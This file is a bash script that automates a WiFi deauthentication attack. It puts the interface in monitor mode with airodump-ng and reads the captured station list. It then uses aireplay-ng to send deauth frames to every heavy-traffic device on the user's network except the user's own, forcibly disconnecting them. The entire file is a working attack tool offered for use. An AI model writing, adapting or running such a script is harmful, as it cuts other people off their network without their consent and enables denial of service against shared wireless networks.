#!/bin/bash

# how long to run airodump for to analyze situation (default: 5)
WAITSECS=5
# threshold that a station must exceed for us to boot it off the wifi
# (default: 200)
THRESHOLD=200
# how many deauth frames do you want to send to each MAC?
DEAUTHFRAMES=10
# what is the exact name of the CSV file that we should parse?
# HINT: Leave this alone if you don't know what you're doing!
CSVFILE='airodump-temp-01.csv'
# Pattern for the CSV file that we'll pass to airodump.  See above hint/warning.
CSVPATTERN='airodump-temp'

##### FUNCTIONS #####
cleanup ()
{
    echo -ne "Quitting soon, cleaning up first...\n"

    if [[ $(pidof aireplay-ng) ]]; then
        echo -ne "Found at least one aireplay-ng running, sending SIGKILL...\n"
        for x in $(pidof aireplay-ng); do
            echo -ne "Sending SIGKILL to PID ${x} ...\n"
            kill -9 "${x}"
        done
    fi

    if [[ $(pidof airodump-ng) ]]; then
        echo -ne "Found at least one airodump-ng running, sending SIGKILL...\n"
        for x in $(pidof airodump-ng); do
            echo -ne "Sending SIGKILL to PID ${x} ...\n"
            kill -9 "${x}"
        done
    fi

    if [[ $(ifconfig | grep "${MONFACE}") ]]; then
    	airmon-ng stop "${MONFACE}" > /dev/null 2>&1
    	echo -ne "Stopped monitoring...\n"
    fi

    if [[ ! -f "${CSVPATTERN}"*.csv ]]; then
        rm "${CSVPATTERN}"*.csv
        echo -ne "Found and removed temp CSV...\n"
    else
        echo -ne "Temp CSV not found...\n"
    fi
    echo -ne "Cleaning up variables...\n"
    cleanvars
    echo -ne "Done cleaning up!\n"
    exit
}

cleanvars ()
{
    unset WAITSECS
    unset THRESHOLD
    unset CHAN
    unset BSSID
    unset MONFACE
    unset IFACE
    unset DEAUTHFRAMES
    unset CSVFILE
    unset CSVPATTERN
    unset OURMAC
    unset STATIONS
    unset I
    unset X
}


# First, make sure you are running as root
if [[ ! $(whoami) = 'root' ]]; then
    echo -ne "You should run this as root!\n"
    exit 1
fi


# if the user hits ^c, we need to remove our temp CSV files and kill the aireplay-ng processes.
trap cleanup INT

# Select WiFi interface
IFACE=`iwgetid -a | cut -d" " -f 1`
echo "Known interfaces:"
ifconfig -a | grep -i link | cut -d" " -f 1

echo -ne "\nỲou're connected with interface [${IFACE}], hit ENTER or type in \
another one: "
read UIFACE
if [ -n "${UIFACE}" ]; then
	IFACE=$UIFACE
fi

# Check BSSID address
BSSID=`iwgetid -a | cut -d" " -f 8`
ESSID=`iwgetid -r`
echo -ne "\nYou are connected to a network named [${ESSID}]  \n"
echo -ne "Hit ENTER to keep BSSID [${BSSID}] of [${ESSID}] or type in \
another one: "
read UBSSID
if [ -n "${UBSSID}" ]; then
	BSSID=$UBSSID
fi

# Check channel
CHAN=`iwgetid -c | cut -d":" -f 2`
echo -ne "\n[${ESSID}] is broadcasting on Channel [${CHAN}]. \
Hit ENTER to keep it or type in another one: "
read UCHAN
if [ -n "${UCHAN}" ]; then
	CHAN=$UCHAN
fi

# Check our MAC
OURMAC=`ifconfig wlan0 | grep -i 'hwaddr' | cut -d" " -f10`


MONFACE="mon0"
echo -ne "\nMonitor interface is [${MONFACE}]. Hit ENTER or type in another one: "
read UMONFACE
if [ -n "${UMONFACE}" ]; then
	MONFACE=$UMONFACE
fi


# look for the monitor interface and start it if it doesn't already exist
ifconfig | grep "${MONFACE}" || airmon-ng start "${IFACE}" > /dev/null 2>&1


# run airodump IN THE BACKGROUND (otherwise it'll block and we can't 'sleep' ...
#...on the mon interface and limit to the BSSID and channel specified ...
# ...and write a CSV file out so we can parse that in a minute
airodump-ng "${MONFACE}" --bssid "${BSSID}" --channel "${CHAN}" --write \
"${CSVPATTERN}" --output-format csv &

# wait however many seconds for airodump to run and gather network info for us
sleep "${WAITSECS}"

# airodump will run as a "background" process but it'll appear in the foreground...
# ...on the screen.  Kill it after waiting for it to gather data.
killall airodump-ng

clear

echo -ne 'These MACs are about to receive a stack of deauth frames in 3 seconds...\r\n'

awk -F, -v p=${THRESHOLD} '/Station/ {i=1; next} i && $5 > p {print "Packets:"$5,"--- MAC:",$1}' "${CSVFILE}" | grep -vi "${OURMAC}"
sleep 3

STATIONS=`awk -F, -v p=${THRESHOLD} '/Station/ {i=1; next} i && $5 > p {print $1}' "${CSVFILE}"| grep -vi "${OURMAC}"`

# for each MAC in basically the above AWK stuff without the pretty printing ...
for STATION in $STATIONS; do
	aireplay-ng -D --deauth "${DEAUTHFRAMES}" "${MONFACE}" -a "${BSSID}" -s \
    "${BSSID}" -c "${STATION}" &
done

clear

# wait for all the aireplay-ng processes to finish before exiting the script
# we need this so we can kill them upon ^c
for x in $(pidof aireplay-ng); do
    wait "${x}"
done
echo -ne "$0 Done\n"

cleanup
# quit and return a valid exit status
exit 0